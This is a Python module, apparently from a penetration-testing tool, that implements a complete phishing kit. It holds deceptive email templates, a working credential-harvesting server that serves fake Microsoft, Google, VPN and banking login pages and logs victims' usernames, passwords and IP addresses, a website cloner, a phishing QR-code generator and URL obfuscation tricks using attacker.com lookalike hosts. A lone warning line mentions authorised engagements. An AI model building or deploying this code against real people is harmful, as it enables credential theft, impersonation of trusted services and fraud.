"""Phishing Toolkit — website cloning, credential harvesting, email templates."""

import sys
import os
import json
import http.server
import threading
import socketserver
from datetime import datetime
from urllib.parse import parse_qs, urlparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm)
from executor import run_with_preview, run_command

STAGE = "phishing"
PHISHING_DIR = os.path.expanduser("~/hackassist_phishing")

# ─── Email Templates ──────────────────────────────────────────────────────────

EMAIL_TEMPLATES = {
    "Password Reset": {
        "subject": "Urgent: Your password has been compromised",
        "body": """Dear {name},

We detected unauthorized access to your {company} account from an unknown device.

For your security, please reset your password immediately:
{link}

If you did not request this change, please contact IT support at {support_email}.

Best regards,
{company} Security Team""",
    },
    "IT Support": {
        "subject": "Action Required: System Update Verification",
        "body": """Hi {name},

As part of our scheduled system maintenance, we need to verify your account credentials.

Please log in to confirm your identity:
{link}

This verification must be completed by {deadline}.

Thank you,
IT Department, {company}""",
    },
    "Invoice/Payment": {
        "subject": "Invoice #{invoice_num} - Payment Required",
        "body": """Dear {name},

Please find attached invoice #{invoice_num} for {amount}.

To view and pay this invoice online:
{link}

Payment is due by {deadline}.

Best regards,
Accounts Receivable
{company}""",
    },
    "Shared Document": {
        "subject": "{sender} shared a document with you",
        "body": """{sender} has shared a document with you via {company} Drive.

Document: {doc_name}
Click to view: {link}

This link expires in 24 hours.

- {company} Drive""",
    },
    "Meeting Invite": {
        "subject": "Updated: Team meeting agenda for {date}",
        "body": """Hi {name},

The agenda for our upcoming meeting has been updated.

Date: {date}
Time: {time}
Location: {link}

Please review the agenda before the meeting:
{link}

Best,
{sender}""",
    },
}

# ─── Credential Harvester Server ──────────────────────────────────────────────

HARVESTER_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>{title}</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               display: flex; justify-content: center; align-items: center; height: 100vh;
               margin: 0; background: #f5f5f5; }}
        .login-box {{ background: white; padding: 40px; border-radius: 8px;
                     box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 360px; }}
        h2 {{ text-align: center; color: #333; margin-bottom: 30px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd;
                border-radius: 4px; box-sizing: border-box; font-size: 14px; }}
        button {{ width: 100%; padding: 12px; background: #0066ff; color: white;
                 border: none; border-radius: 4px; cursor: pointer; font-size: 16px;
                 margin-top: 12px; }}
        button:hover {{ background: #0052cc; }}
        .logo {{ text-align: center; margin-bottom: 20px; font-size: 24px; }}
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">{logo}</div>
        <h2>{heading}</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <p style="text-align:center;color:#999;font-size:12px;margin-top:20px;">{footer}</p>
    </div>
</body>
</html>"""

LOGIN_TEMPLATES = {
    "Generic Login": {"title": "Sign In", "logo": "🔐", "heading": "Account Login", "footer": "Secure login portal"},
    "Office 365": {"title": "Sign in - Microsoft", "logo": "📧", "heading": "Sign in to your account", "footer": "Microsoft Corporation"},
    "Google": {"title": "Sign in - Google", "logo": "🔍", "heading": "Sign in with Google", "footer": "Google LLC"},
    "Corporate VPN": {"title": "VPN Portal", "logo": "🛡️", "heading": "VPN Authentication", "footer": "IT Security"},
    "Banking": {"title": "Secure Banking", "logo": "🏦", "heading": "Online Banking Login", "footer": "Your bank. Your security."},
}

_captured_creds = []


class HarvesterHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP handler that captures POST credentials."""

    template_data = LOGIN_TEMPLATES["Generic Login"]
    redirect_url = "https://www.google.com"

    def do_GET(self):
        html = HARVESTER_HTML.format(**self.template_data)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        params = parse_qs(post_data)

        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        client_ip = self.client_address[0]
        timestamp = datetime.now().isoformat()

        cred = {
            "username": username,
            "password": password,
            "ip": client_ip,
            "timestamp": timestamp,
            "user_agent": self.headers.get('User-Agent', ''),
        }
        _captured_creds.append(cred)

        # Log to file
        log_path = os.path.join(PHISHING_DIR, "captured_creds.json")
        os.makedirs(PHISHING_DIR, exist_ok=True)
        with open(log_path, "a") as f:
            f.write(json.dumps(cred) + "\n")

        console.print(f"\n  [bold red][CAPTURED][/bold red] {username}:{password} from {client_ip}")

        # Redirect to legitimate site
        self.send_response(302)
        self.send_header("Location", self.redirect_url)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # Suppress default logging


# ─── Menu Functions ───────────────────────────────────────────────────────────

def run(session):
    show_stage_header("Phishing Toolkit", "Social engineering — credential harvesting & email templates")

    warning("Phishing attacks require explicit authorization. Use only in authorized engagements.")

    while True:
        cred_count = len(_captured_creds)
        if cred_count > 0:
            console.print(f"  [bold green]Captured credentials: {cred_count}[/bold green]\n")

        options = [
            ("1", "Start Credential Harvester (fake login page)"),
            ("2", "Clone a Website"),
            ("3", "Generate Phishing Email"),
            ("4", "View Captured Credentials"),
            ("5", "QR Code Phishing Generator"),
            ("6", "URL Obfuscation Techniques"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _credential_harvester()
        elif choice == "2":
            _clone_website(session)
        elif choice == "3":
            _generate_email()
        elif choice == "4":
            _view_creds()
        elif choice == "5":
            _qr_phishing()
        elif choice == "6":
            _url_obfuscation()


def _credential_harvester():
    console.print("\n[bold cyan]Credential Harvester — Fake Login Page[/bold cyan]\n")

    # Select template
    template_options = [(str(i+1), name) for i, name in enumerate(LOGIN_TEMPLATES.keys())]
    template_options.append(("0", "Back"))
    console.print("[bold]Select login page template:[/bold]")
    choice = show_menu(template_options)
    if choice == "0":
        return

    template_name = list(LOGIN_TEMPLATES.keys())[int(choice) - 1]
    HarvesterHandler.template_data = LOGIN_TEMPLATES[template_name]

    redirect = ask("Redirect URL after capture", default="https://www.google.com")
    HarvesterHandler.redirect_url = redirect

    port = int(ask("Listener port", default="8080"))

    info(f"Starting {template_name} harvester on port {port}...")
    info(f"Send victims to: http://YOUR_IP:{port}")
    info("Press Ctrl+C in the terminal to stop.\n")

    try:
        server = socketserver.TCPServer(("0.0.0.0", port), HarvesterHandler)
        server.timeout = 2
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        success(f"Harvester running on port {port}")
        info("Credentials will appear here as they're captured.")
        info("Use menu option 4 to view all captured creds.")
    except OSError as e:
        error(f"Failed to start: {e}")


def _clone_website(session):
    console.print("\n[bold cyan]Website Cloner[/bold cyan]\n")
    url = ask("URL to clone")
    output_dir = ask("Output directory", default=os.path.join(PHISHING_DIR, "cloned_site"))

    os.makedirs(output_dir, exist_ok=True)

    options = [
        ("1", "wget (full mirror)"),
        ("2", "curl (single page)"),
        ("3", "httrack (deep clone)"),
        ("0", "Back"),
    ]
    choice = show_menu(options)

    if choice == "1":
        run_with_preview(
            f"wget --mirror --convert-links --adjust-extension --page-requisites "
            f"--no-parent -P '{output_dir}' '{url}'",
            session, STAGE
        )
    elif choice == "2":
        run_with_preview(f"curl -sL '{url}' -o '{output_dir}/index.html'", session, STAGE)
    elif choice == "3":
        run_with_preview(f"httrack '{url}' -O '{output_dir}'", session, STAGE)

    if os.path.exists(output_dir):
        success(f"Site cloned to: {output_dir}")
        info(f"Serve it: python3 -m http.server 8080 --directory '{output_dir}'")


def _generate_email():
    console.print("\n[bold cyan]Phishing Email Generator[/bold cyan]\n")

    template_options = [(str(i+1), name) for i, name in enumerate(EMAIL_TEMPLATES.keys())]
    template_options.append(("0", "Back"))
    console.print("[bold]Select email template:[/bold]")
    choice = show_menu(template_options)
    if choice == "0":
        return

    template_name = list(EMAIL_TEMPLATES.keys())[int(choice) - 1]
    template = EMAIL_TEMPLATES[template_name]

    # Collect variables
    variables = {
        "name": ask("Victim's name", default="User"),
        "company": ask("Company name", default="ACME Corp"),
        "link": ask("Phishing URL"),
        "sender": ask("Sender name", default="IT Support"),
        "support_email": ask("Support email", default="support@company.com"),
        "deadline": ask("Deadline", default="end of business today"),
        "date": ask("Date", default=datetime.now().strftime("%B %d, %Y")),
        "time": ask("Time", default="2:00 PM"),
        "doc_name": ask("Document name", default="Q4 Report"),
        "invoice_num": ask("Invoice number", default="INV-2024-001"),
        "amount": ask("Amount", default="$1,299.00"),
    }

    subject = template["subject"]
    body = template["body"]
    for key, value in variables.items():
        subject = subject.replace("{" + key + "}", value)
        body = body.replace("{" + key + "}", value)

    console.print(f"\n[bold cyan]Generated Email:[/bold cyan]\n")
    console.print(f"[bold]Subject:[/bold] {subject}\n")
    console.print(f"[bold]Body:[/bold]\n{body}\n")

    if confirm("Save to file?", default=False):
        filepath = os.path.join(PHISHING_DIR, f"email_{template_name.replace(' ', '_')}.txt")
        os.makedirs(PHISHING_DIR, exist_ok=True)
        with open(filepath, "w") as f:
            f.write(f"Subject: {subject}\n\n{body}")
        success(f"Saved: {filepath}")


def _view_creds():
    log_path = os.path.join(PHISHING_DIR, "captured_creds.json")

    all_creds = list(_captured_creds)
    if os.path.exists(log_path):
        with open(log_path, "r") as f:
            for line in f:
                try:
                    all_creds.append(json.loads(line))
                except json.JSONDecodeError:
                    pass

    if not all_creds:
        info("No credentials captured yet.")
        return

    console.print(f"\n[bold cyan]Captured Credentials ({len(all_creds)}):[/bold cyan]\n")
    for i, cred in enumerate(all_creds, 1):
        console.print(f"  [bold red]{i}.[/bold red] [bold]{cred.get('username', 'N/A')}[/bold]"
                      f":[yellow]{cred.get('password', 'N/A')}[/yellow]"
                      f" [dim]from {cred.get('ip', 'N/A')} at {cred.get('timestamp', 'N/A')[:19]}[/dim]")
    console.print()


def _qr_phishing():
    console.print("\n[bold cyan]QR Code Phishing[/bold cyan]\n")
    url = ask("Phishing URL to encode")

    console.print("\n[bold]Generate QR code with:[/bold]\n")
    console.print(f"  [yellow]Python (qrcode library):[/yellow]")
    console.print(f"  [white]pip3 install qrcode[Pillow] && python3 -c \"import qrcode; qrcode.make('{url}').save('qr.png')\"[/white]\n")
    console.print(f"  [yellow]Command line (qrencode):[/yellow]")
    console.print(f"  [white]brew install qrencode && qrencode -o qr.png '{url}'[/white]\n")
    console.print(f"  [yellow]ASCII in terminal:[/yellow]")
    console.print(f"  [white]qrencode -t UTF8 '{url}'[/white]\n")

    if confirm("Generate QR code now?", default=False):
        run_with_preview(
            f"python3 -c \"import qrcode; qrcode.make('{url}').save('phishing_qr.png'); print('Saved: phishing_qr.png')\" "
            f"2>/dev/null || echo 'Install: pip3 install qrcode[Pillow]'",
            None, STAGE
        )


def _url_obfuscation():
    url = ask("URL to obfuscate")

    console.print(f"\n[bold cyan]URL Obfuscation Techniques:[/bold cyan]\n")

    # Parse URL
    parsed = urlparse(url)
    domain = parsed.netloc or url

    techniques = {
        "URL Shortening": "Use bit.ly, tinyurl.com, is.gd to shorten the URL",
        "Subdomain trick": f"http://login.{domain}.attacker.com",
        "@ symbol trick": f"http://legitimate-site.com@attacker.com/login",
        "Homograph attack": f"Replace characters with lookalikes: 0→o, l→1, rn→m",
        "IP address": "Convert domain to IP: ping the domain, use the IP",
        "Hex encoding": f"Convert IP octets to hex: http://0x7f000001/ = 127.0.0.1",
        "URL encoding": url.replace("://", "%3A%2F%2F").replace("/", "%2F"),
        "Data URI": f"data:text/html,<script>location='{url}'</script>",
        "Zero-width chars": "Insert zero-width spaces in the domain display name",
    }

    for name, desc in techniques.items():
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"    [white]{desc}[/white]\n")
